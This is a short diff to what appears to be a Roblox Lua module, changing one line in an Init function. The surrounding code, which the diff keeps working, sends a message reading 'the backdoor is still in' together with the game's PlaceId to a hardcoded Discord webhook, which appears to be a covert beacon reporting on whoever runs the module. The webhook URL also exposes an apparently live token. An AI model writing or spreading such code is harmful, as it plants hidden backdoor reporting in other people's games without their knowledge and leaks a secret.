@@ -20,7 +20,7 @@ function m:Init()
 	if disabled == true then
 		local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
 		local Info = {
-			Message = "the backdoor is still in", Game.PlaceId;
+			Message = "the backdoor is still in", game.PlaceId;
 			Title = "Lololol"
 		}
 		
